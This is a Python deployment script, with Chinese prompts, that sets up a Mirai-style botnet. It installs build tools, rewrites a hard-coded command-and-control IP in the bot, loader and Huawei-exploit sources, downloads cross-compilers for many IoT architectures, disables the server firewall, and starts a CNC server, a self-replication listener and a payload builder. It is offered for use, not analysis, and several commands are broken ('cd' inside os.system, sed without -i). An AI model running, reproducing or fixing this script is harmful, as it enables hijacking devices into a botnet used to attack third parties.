import platform
import re
import os
import requests

input("在运行之前使用 bot/table.c 中的 tools/xor.c 更改域，如果已经完成，请按 enter")

server_ip = requests.get("https://text.myip.wtf")
os.system("yum update -y")
os.system("yum install epel-release -y")
os.system("yum groupinstall 'Development Tools' -y")
os.system("yum install gmp-devel -y")
os.system("ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10")
os.system("yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y")
os.system("cd /tmp")
os.system("wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz")
os.system("sha256sum go1.13.linux-amd64.tar.gz")
os.system("sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz")
os.system("export PATH=$PATH:/usr/local/go/bin")
os.system("export GOROOT=/usr/local/go")
os.system("export GOPATH=$HOME/Projects/Proj1")
os.system("export PATH=$GOPATH/bin:$GOROOT/bin:$PATH")
os.system("export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords")
os.system("source ~/.bash_profile")
os.system("go version")
os.system("go env")
os.system("cd ~/")
os.system(f"sed 's/46.3.112.9/{server_ip}/g' *")
os.system(f"cd loader/src/")
os.system(f"sed 's/46.3.112.9/{server_ip}/g' *")
os.system(f"cd loader/src/headers/")
os.system(f"sed 's/46.3.112.9/{server_ip}/g' *")
os.system(f"cd dlr/main.c")
os.system(f"sed 's/46.3.112.9/{server_ip}/g' *")
os.system(f"cd bot/huawei.c")
os.system(f"sed 's/46.3.112.9/{server_ip}/g' *")
os.system(f"cd bot/util.c")
os.system(f"sed 's/46.3.112.9/{server_ip}/g' *")
os.system(f"mkdir /etc/xcompile")
os.system(f"cd /etc/xcompile")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2")
os.system(f"wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2")
os.system(f"wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2")
os.system(f"wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz")
os.system(f"tar -jxf cross-compiler-i586.tar.bz2")
os.system(f"tar -jxf cross-compiler-m68k.tar.bz2")
os.system(f"tar -jxf cross-compiler-mips.tar.bz2")
os.system(f"tar -jxf cross-compiler-mipsel.tar.bz2")
os.system(f"tar -jxf cross-compiler-powerpc.tar.bz2")
os.system(f"tar -jxf cross-compiler-sh4.tar.bz2")
os.system(f"tar -jxf cross-compiler-sparc.tar.bz2")
os.system(f"tar -jxf cross-compiler-armv4l.tar.bz2")
os.system(f"tar -jxf cross-compiler-armv5l.tar.bz2")
os.system(f"tar -jxf cross-compiler-armv6l.tar.bz2")
os.system(f"tar -jxf cross-compiler-armv7l.tar.bz2")
os.system(f"tar -jxf cross-compiler-x86_64.tar.bz2")
os.system(f"rm -rf *.tar.*")
os.system(f"mv cross-compiler-i586 i586")
os.system(f"mv cross-compiler-m68k m68k")
os.system(f"mv cross-compiler-mips mips")
os.system(f"mv cross-compiler-mipsel mipsel")
os.system(f"mv cross-compiler-powerpc powerpc")
os.system(f"mv cross-compiler-sh4 sh4")
os.system(f"mv cross-compiler-sparc sparc")
os.system(f"mv cross-compiler-armv4l armv4l")
os.system(f"mv cross-compiler-armv5l armv5l")
os.system(f"mv cross-compiler-armv6l armv6l")
os.system(f"mv cross-compiler-armv7l armv7l")
os.system(f"mv cross-compiler-x86_64 x86_64")
os.system(f"service firewalld stop")
os.system(f"service iptables stop ")
os.system(f"service httpd restart  ")
os.system(f"service mariadb stop")
os.system(f"cd ~/cnc")
os.system(f"sh build.sh")
os.system(f"cd ~/")
os.system(f"chmod 777 *")
os.system(f"./build.sh")
cncport = input("首选 CNC 端口（例如：1337）：")
os.system(f"screen -dmS cnc ./cnc 56999 1337 10")
os.system(f"screen -dmS selfrep ./listen")
os.system(f"cd ~/")
os.system(f"python payload.py")
os.system(f"clear")
os.system(f"./build.sh")
print("黎明的曙光 编译成功")
print("\r\n\n")